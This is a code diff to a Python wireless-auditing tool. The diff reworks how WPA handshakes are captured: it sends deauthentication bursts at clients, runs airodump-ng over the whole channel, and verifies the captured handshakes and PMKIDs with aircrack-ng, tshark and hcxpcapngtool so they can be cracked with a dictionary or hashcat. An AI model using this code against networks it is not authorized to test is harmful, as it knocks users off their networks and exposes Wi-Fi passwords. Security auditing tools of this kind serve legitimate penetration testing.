@@ -291,33 +291,34 @@ def _verify(cap_path: str, bssid: str, tmpdir: str) -> bool:
     except OSError:
         return False
 
-    # Primary: aircrack-ng
     if _verify_aircrack(cap_path, bssid, tmpdir):
         return True
-
-    # Fallback: tshark
     if _verify_tshark(cap_path, bssid):
         return True
-
+    if _verify_hcxpcapngtool(cap_path, bssid, tmpdir):
+        return True
     return False
 
 
 def _verify_aircrack(cap_path: str, bssid: str, tmpdir: str) -> bool:
-    """aircrack-ng verification — identical to airgeddon."""
+    """aircrack-ng verification. -q flag intentionally omitted: it suppresses the
+    'WPA (N handshake)' line in several aircrack-ng versions."""
     wl = os.path.join(tmpdir, '_verify_wl.txt')
     try:
         with open(wl, 'w') as f:
             f.write('wifi_auditor_verify_impossible_xyzzy\n')
     except OSError:
-        wl = '/dev/null'
+        wl = None
+
+    cmd = ['aircrack-ng', '-a', '2', '-b', bssid.upper()]
+    if wl:
+        cmd += ['-w', wl]
+    cmd.append(cap_path)
 
     try:
-        r = subprocess.run(
-            ['aircrack-ng', '-a', '2', '-b', bssid.upper(),
-             '-w', wl, '-l', '/dev/null', '-q', cap_path],
-            capture_output=True, text=True, timeout=20,
-        )
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
         out = r.stdout + r.stderr
+        logger.debug("aircrack-ng output: %s", out[:400])
 
         # "WPA (1 handshake)" or "WPA (2 handshakes)"
         m = re.search(r'WPA\s*\((\d+)\s+handshake', out, re.IGNORECASE)
@@ -325,61 +326,68 @@ def _verify_aircrack(cap_path: str, bssid: str, tmpdir: str) -> bool:
             logger.info("aircrack-ng verified: %s handshake(s)", m.group(1))
             return True
 
-        # Older aircrack-ng versions: "1 handshake"
+        # Older aircrack-ng: bare "1 handshake"
         m2 = re.search(r'(\d+)\s+handshake', out, re.IGNORECASE)
         if m2 and int(m2.group(1)) > 0:
             logger.info("aircrack-ng verified (alt): %s handshake(s)", m2.group(1))
             return True
 
     except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as exc:
-        logger.debug("aircrack-ng verify failed: %s", exc)
+        logger.debug("aircrack-ng verify error: %s", exc)
 
     return False
 
 
 def _verify_tshark(cap_path: str, bssid: str) -> bool:
-    """
-    tshark fallback verification — catches EAPOL handshakes that
-    aircrack-ng sometimes misses (known issue with certain frame orderings).
-    """
+    """Count EAPOL-Key frames (type 3) for the BSSID.
+    >= 2 frames means at least M1+M2 are present — enough for a dictionary attack."""
     if not shutil.which('tshark'):
         return False
 
+    bssid_lc = bssid.lower()
     try:
         r = subprocess.run(
-            ['tshark', '-r', cap_path, '-Y',
-             f'eapol && wlan.addr=={bssid.lower()}',
-             '-T', 'fields', '-e', 'eapol.keydes.key_info'],
+            ['tshark', '-r', cap_path,
+             '-Y', f'eapol.type == 3 && wlan.addr == {bssid_lc}',
+             '-T', 'fields', '-e', 'frame.number'],
             capture_output=True, text=True, timeout=15,
         )
-
-        key_infos = [line.strip() for line in r.stdout.splitlines() if line.strip()]
-        if len(key_infos) < 2:
-            return False
-
-        # Need at least M1 (has ANonce) + M2 (has SNonce + MIC)
-        # Key Info bit patterns:
-        #   M1: 0x008a or 0x008b (Pairwise + ACK, no MIC)
-        #   M2: 0x010a or 0x010b (Pairwise + MIC, no ACK)
-        has_m1 = False
-        has_m2 = False
-        for ki in key_infos:
-            try:
-                val = int(ki, 0)
-                if val & 0x0080 and not (val & 0x0100):  # ACK set, MIC not set → M1
-                    has_m1 = True
-                if val & 0x0100 and not (val & 0x0080):  # MIC set, ACK not set → M2
-                    has_m2 = True
-            except (ValueError, TypeError):
-                continue
-
-        if has_m1 and has_m2:
-            logger.info("tshark verified: M1+M2 EAPOL frames found")
+        count = sum(1 for ln in r.stdout.splitlines() if ln.strip())
+        logger.debug("tshark EAPOL-Key count for %s: %d", bssid, count)
+        if count >= 2:
+            logger.info("tshark verified: %d EAPOL-Key frames found", count)
             return True
-
     except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as exc:
-        logger.debug("tshark verify failed: %s", exc)
+        logger.debug("tshark verify error: %s", exc)
 
+    return False
+
+
+def _verify_hcxpcapngtool(cap_path: str, bssid: str, tmpdir: str) -> bool:
+    """Convert cap → hc22000 with hcxpcapngtool/hcxpcaptool and check for our BSSID.
+    This is the most reliable handshake detector — it's the same tool hashcat uses."""
+    hc22k = os.path.join(tmpdir, f'_chk_{os.getpid()}.hc22000')
+    try:
+        for tool in ('hcxpcapngtool', 'hcxpcaptool'):
+            if not shutil.which(tool):
+                continue
+            subprocess.run([tool, '-o', hc22k, cap_path],
+                           capture_output=True, timeout=20)
+            if os.path.exists(hc22k) and os.path.getsize(hc22k) > 0:
+                needle = bssid.lower().replace(':', '')
+                with open(hc22k, 'r', errors='replace') as fh:
+                    for line in fh:
+                        if needle in line.lower().replace(':', ''):
+                            logger.info("hcxpcapngtool verified: hash found for %s", bssid)
+                            return True
+    except (FileNotFoundError, subprocess.TimeoutExpired, OSError) as exc:
+        logger.debug("hcxpcapngtool verify error: %s", exc)
+    finally:
+        try:
+            if os.path.exists(hc22k):
+                os.remove(hc22k)
+        except OSError:
+            pass
     return False
 
 
@@ -477,6 +485,29 @@ def _start_deauth(
         cmd += ['-c', client_mac]
     cmd.append(iface)
     logger.info("Deauth start (infinite): target=%s client=%s", bssid, client_mac or "broadcast")
+    return _popen(cmd)
+
+
+# ─── Dedicated capture airodump-ng launcher ──────────────────────────────────
+
+def _start_airodump_capture(
+    iface: str,
+    channel: int,
+    cap_prefix: str,
+) -> subprocess.Popen:
+    """
+    Start airodump-ng for handshake capture WITHOUT a BSSID filter.
+
+    Why no -d/--bssid filter:
+    - Some APs advertise one BSSID in beacons but stamp a variant in EAPOL frames
+      (e.g., multi-BSSID sets, band-steering MACs).  The filter silently drops those.
+    - Verification (aircrack-ng, tshark, hcxpcapngtool) all do their own BSSID
+      filtering internally, so we don't need it at the capture layer.
+    - Capturing everything on the channel is the approach used by industry tools
+      (bettercap, hashcat-utils) and is strictly more robust.
+    """
+    cmd = ['airodump-ng', '-c', str(channel), '-w', cap_prefix, iface]
+    logger.debug("Capture airodump: ch=%d prefix=%s", channel, cap_prefix)
     return _popen(cmd)
 
 
@@ -729,13 +760,7 @@ def capture_handshake(
         # ── Launch dedicated capture airodump (sole user of the interface) ──
         _rm(cap_prefix)
         print(f'  [*] Starting capture on channel {channel} ({bssid})...')
-        airodump_proc = _popen([
-            'airodump-ng',
-            '-c', str(channel),
-            '-d', bssid.upper(),
-            '-w', cap_prefix,
-            iface,
-        ])
+        airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
         child_procs.append(airodump_proc)
 
         # Wait for the cap file to appear (some adapters take a moment)
@@ -747,13 +772,7 @@ def capture_handshake(
             if not _is_alive(airodump_proc):
                 logger.error("airodump-ng failed to start!")
                 print('  [!] airodump-ng failed to start — retrying...')
-                airodump_proc = _popen([
-                    'airodump-ng',
-                    '-c', str(channel),
-                    '-d', bssid.upper(),
-                    '-w', cap_prefix,
-                    iface,
-                ])
+                airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
                 child_procs.append(airodump_proc)
             time.sleep(0.5)
 
@@ -804,14 +823,17 @@ def capture_handshake(
             if not _is_alive(airodump_proc):
                 logger.error("airodump-ng died during Phase 2!")
                 print('  [!] airodump-ng crashed — restarting...')
-                airodump_proc = _popen([
-                    'airodump-ng',
-                    '-c', str(channel),
-                    '-d', bssid.upper(),
-                    '-w', cap_prefix,
-                    iface,
-                ])
+                airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
                 child_procs.append(airodump_proc)
+
+            # Immediate check — handshake sometimes arrives during/just after the burst
+            cap = _find_cap(cap_prefix)
+            if cap and _verify(cap, bssid, tmpdir):
+                elapsed = int(time.time() - start_time)
+                print(f'  [+] Handshake FOUND right after burst #{burst_num}! [{elapsed}s]')
+                logger.info("Handshake FOUND post-burst #%d at %ds", burst_num, elapsed)
+                _cleanup_all()
+                return _save(cap, bssid)
 
             # Reassociation window — stay silent for the full window so the
             # client can reconnect and complete the 4-way handshake.
@@ -825,10 +847,7 @@ def capture_handshake(
                 # Restart airodump if it died mid-window
                 if not _is_alive(airodump_proc):
                     logger.error("airodump-ng died during reassoc window!")
-                    airodump_proc = _popen([
-                        'airodump-ng', '-c', str(channel),
-                        '-d', bssid.upper(), '-w', cap_prefix, iface,
-                    ])
+                    airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
                     child_procs.append(airodump_proc)
                 cap = _find_cap(cap_prefix)
                 if cap and _verify(cap, bssid, tmpdir):
@@ -866,14 +885,17 @@ def capture_handshake(
                 if not _is_alive(airodump_proc):
                     logger.error("airodump-ng died during Phase 3!")
                     print('  [!] airodump-ng crashed — restarting...')
-                    airodump_proc = _popen([
-                        'airodump-ng',
-                        '-c', str(channel),
-                        '-d', bssid.upper(),
-                        '-w', cap_prefix,
-                        iface,
-                    ])
+                    airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
                     child_procs.append(airodump_proc)
+
+                # Immediate check — handshake sometimes arrives during/just after the burst
+                cap = _find_cap(cap_prefix)
+                if cap and _verify(cap, bssid, tmpdir):
+                    elapsed = int(time.time() - start_time)
+                    print(f'  [+] Handshake FOUND right after broadcast burst #{burst_num}! [{elapsed}s]')
+                    logger.info("Handshake FOUND post-broadcast-burst #%d at %ds", burst_num, elapsed)
+                    _cleanup_all()
+                    return _save(cap, bssid)
 
                 reassoc_end = min(time.time() + REASSOC_WAIT, phase3_end, absolute_deadline)
                 while time.time() < reassoc_end:
@@ -884,10 +906,7 @@ def capture_handshake(
                     time.sleep(1)
                     if not _is_alive(airodump_proc):
                         logger.error("airodump-ng died during reassoc window!")
-                        airodump_proc = _popen([
-                            'airodump-ng', '-c', str(channel),
-                            '-d', bssid.upper(), '-w', cap_prefix, iface,
-                        ])
+                        airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
                         child_procs.append(airodump_proc)
                     cap = _find_cap(cap_prefix)
                     if cap and _verify(cap, bssid, tmpdir):
@@ -916,6 +935,26 @@ def capture_handshake(
                 print(f'  [+] PMKID captured!')
                 logger.info("PMKID captured: %s", pmkid_result)
                 return _save(pmkid_result, bssid)
+
+        # ── Last-chance: save whatever was captured for manual inspection ─────
+        # Even if automated verification failed, the cap file may contain a
+        # handshake that a different aircrack-ng version or hashcat can crack.
+        cap = _find_cap(cap_prefix)
+        if cap:
+            try:
+                cap_sz = os.path.getsize(cap)
+            except OSError:
+                cap_sz = 0
+            if cap_sz > 10_000:
+                logger.info("Final verification attempt on %d-byte cap", cap_sz)
+                if _verify(cap, bssid, tmpdir):
+                    return _save(cap, bssid)
+                dest = _save(cap, bssid)
+                print(f'\n  [!] Automated verification inconclusive — file saved.')
+                print(f'      Verify manually: aircrack-ng -b {bssid.upper()} {dest}')
+                print(f'      Or try hashcat:  hcxpcapngtool -o {dest.replace(".cap",".hc22000")} {dest}')
+                logger.info("Saved unverified cap (%d bytes): %s", cap_sz, dest)
+                return dest
 
         elapsed = int(time.time() - start_time)
         print(f'  [-] No handshake captured after {elapsed}s.')
